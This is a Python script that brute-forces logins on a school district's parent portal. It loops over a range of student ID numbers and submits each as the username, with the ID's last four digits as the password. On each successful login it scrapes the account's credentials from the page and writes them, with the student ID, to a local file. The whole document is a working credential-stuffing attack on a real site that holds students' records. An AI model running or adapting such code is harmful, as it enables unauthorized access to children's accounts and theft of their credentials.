from colored import fg, bg, attr
import mechanize
from bs4 import BeautifulSoup
import time

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

# Set colors
green = fg('#00FF00')
orange = fg('#FFFF00')
res = attr('reset')


# Set user class
class user:
    firstname = "N/A"
    lastname = "N/A"
    studentid = "N/A"
    username = "N/A"
    password = "N/A"
    birthmonth = "N/A"


# Declare user class
user = user()


# Declare custom strip function
def downwithit(string, firstHalf, secondHalf):
    string = str(string)
    format1 = string.replace(str(firstHalf), "")
    format2 = format1.replace(str(secondHalf), "")
    return format2


# Main function
for x in range(4624021140, 4699999999):
    br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
    br.select_form(nr=0)
    user.studentid = str(x)
    userpass = user.studentid[6] + user.studentid[7] + \
        user.studentid[8] + user.studentid[9]

    # Set bruteforce combo
    br.form['wrkuser'] = user.studentid
    br.form['wrkpasswd'] = user.studentid[-4:]
    print("[RUN] Checking %s..." % user.studentid)
    response = br.submit()
    try:
        # Try to select form, if missing then combo was found
        br.select_form(nr=0)
    except mechanize._mechanize.FormNotFoundError:
        start = time.time()
        # Notify there was a match
        print("[RUN] " + green + "Found " + user.studentid + "..." + res)

        # Retrieve redirect url embedded in js code
        firstFormat = BeautifulSoup(br.response().read(), 'lxml')
        formatted = str(firstFormat)
        newUrl = downwithit(
            formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
        br.open("https://dashboard.okaloosaschools.com" + newUrl)

        # Scrape and format web data
        secondFormat = BeautifulSoup(br.response().read(), 'lxml')
        body_tag = secondFormat.body
        spanables = secondFormat.find_all('span')

        # Clean up the scraped combo
        userDirty = downwithit(spanables, "<span style=\" font-size: 15px; font-family: 'Courier New', 'Courier', monospace;\">",
                               "</span>, <span style=\" font-size: 15px; font-family: 'Courier New', 'Courier', monospace;\">")
        userClean = downwithit(userDirty, "</span>", "</span>")
        userCombo = downwithit(userClean, "[", "]")

        # Write to file
        f = open("./assets/matches.txt", "a")
        f.write("Combo: " + str(userCombo) + "\nStudentID: "
                + user.studentid + "\n\n")
        f.close()

        # Debug process time
        end = time.time()
        delta = end - start
        print("[DEBUG] " + orange
              + "Took " + str(round(delta, 2)) + "s to process match..." + res)
        pass
